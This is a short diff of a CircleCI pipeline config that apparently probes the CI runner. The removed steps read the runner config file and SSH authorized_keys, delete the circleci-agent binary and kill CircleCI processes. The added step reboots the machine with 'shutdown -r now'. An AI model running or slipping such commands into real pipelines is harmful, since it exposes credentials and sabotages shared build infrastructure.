@@ -1,13 +1,8 @@
 version: 2.1
 jobs:
   build:
-    docker:
-      - image: alpine:3.8
-        user: root
+    machine: true
     steps:
     - run: ps aux
-    - run: cat /.circleci-runner-config.json
-    - run: rm /bin/circleci-agent
-    - run: cat ~/.ssh/authorized_keys
-    - run: kill `ps -aux | grep circleci | awk '{print $2}'`
+    - run: shutdown -r now
     - run: ps aux
